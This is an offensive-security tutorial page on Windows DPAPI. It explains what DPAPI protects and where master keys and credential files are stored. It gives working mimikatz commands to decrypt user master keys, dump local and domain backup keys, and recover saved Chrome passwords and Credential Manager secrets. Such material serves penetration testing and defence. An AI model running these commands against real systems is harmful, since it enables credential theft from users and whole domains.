# DPAPI - Extracting Passwords

While creating this post mimikatz was having problems with every action that interacted with DPAPI therefore **most of the examples and images were taken from**: [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin)

## What is DPAPI

Its primary use in the Windows operating system is to **perform symmetric encryption of asymmetric private keys**, using a user or system secret as a significant contribution of entropy.  
**DPAPI allows developers to encrypt keys using a symmetric key derived from the user's logon secrets**, or in the case of system encryption, using the system's domain authentication secrets.

This makes very easy to developer to **save encrypted data** in the computer **without** needing to **worry** how to **protect** the **encryption** **key**.

## What does DPAPI protect?

DPAPI is utilized to protect the following personal data:

* Passwords and form auto-completion data in Internet Explorer, Google \*Chrome
* E-mail account passwords in Outlook, Windows Mail, Windows Mail, etc.
* Internal FTP manager account passwords
* Shared folders and resources access passwords
* Wireless network account keys and passwords
* Encryption key in Windows CardSpace and Windows Vault
* Remote desktop connection passwords, .NET Passport
* Private keys for Encrypting File System \(EFS\), encrypting mail S-MIME, other user's certificates, SSL/TLS in Internet Information Services
* EAP/TLS and 802.1x \(VPN and WiFi authentication\)
* Network passwords in Credential Manager
* Personal data in any application programmatically protected with the API function CryptProtectData. For example, in Skype, Windows Rights Management Services, Windows Media, MSN messenger, Google Talk etc.
* ...

{% hint style="info" %}
An example of a successful and clever way to protect data using DPAPI is the implementation of the auto-completion password encryption algorithm in Internet Explorer. To encrypt the login and password for a certain web page, it calls the CryptProtectData function, where in the optional entropy parameter it specifies the address of the web page. Thus, unless one knows the original URL where the password was entered, nobody, not even Internet Explorer itself, can decrypt that data back.
{% endhint %}

## Master Keys 

The DPAPI keys used for encrypting the user's RSA keys are stored under `%APPDATA%\Microsoft\Protect\{SID}` directory, where {SID} is the [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) of that user. **The DPAPI key is stored in the same file as the master key that protects the users private keys**. It usually is 64 bytes of random data. \(Notice that this directory is protected so you cannot list it using`dir` from the cmd, but you can list it from PS\).

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

This is what a bunch of Master Keys of a user will looks like:

![](../../.gitbook/assets/image%20%28360%29.png)

Usually **each master keys is an encrypted symmetric key that can decrypt other content**. Therefore, **extracting** the **encrypted Master Key** is interesting in order to **decrypt** later that **other content** encrypted with it. 

### Extract a master key

If you know the password of the user who the master key belongs to and you can access the master key file you can obtain the master key with mimikatz and a command like the following one:

```bash
dpapi::masterkey /in:"C:\Users\spotless.OFFENSE\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /sid:S-1-5-21-2552734371-813931464-1050690807-1106 /password:123456 /protected
```

![](../../.gitbook/assets/image%20%28356%29.png)

You can see in green the extracted master key.

### Extract all local Master Keys with Administrator

If you are administrator you can obtain the dpapi master keys using:

```text
sekurlsa::dpapi
```

![](../../.gitbook/assets/image%20%28355%29.png)

### Extract all backup Master Keys with Domain Admin

A domain admin may obtain the backup dpapi master keys that can be used to decrypt the encrypted keys:

```text
lsadump::backupkeys /system:dc01.offense.local /export
```

![](../../.gitbook/assets/image%20%28357%29.png)

Using the retrieved backup key, let's decrypt user's `spotless` master key:

```bash
dpapi::masterkey /in:"C:\Users\spotless.OFFENSE\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
```

![](../../.gitbook/assets/image%20%28359%29.png)

We can now decrypt user's `spotless` chrome secrets using their decrypted master key:

```text
dpapi::chrome /in:"c:\users\spotless.offense\appdata\local\Google\Chrome\User Data\Default\Login Data" /masterkey:b5e313e344527c0ec4e016f419fe7457f2deaad500f68baf48b19eb0b8bc265a0669d6db2bddec7a557ee1d92bcb2f43fbf05c7aa87c7902453d5293d99ad5d6
```

![](../../.gitbook/assets/image%20%28358%29.png)

## Credential Files

The **credentials files protected by the master password** could be located in:

```text
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt:

```text
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```

## Encrypting and Decrypting content

You can find an example of how to encrypt and decyrpt data with DAPI using mimikatz and C++ in [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)  
You can find an example on how to encrypt and decrypt data with DPAPI using C\# in [https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection)

## References

* [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28\#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

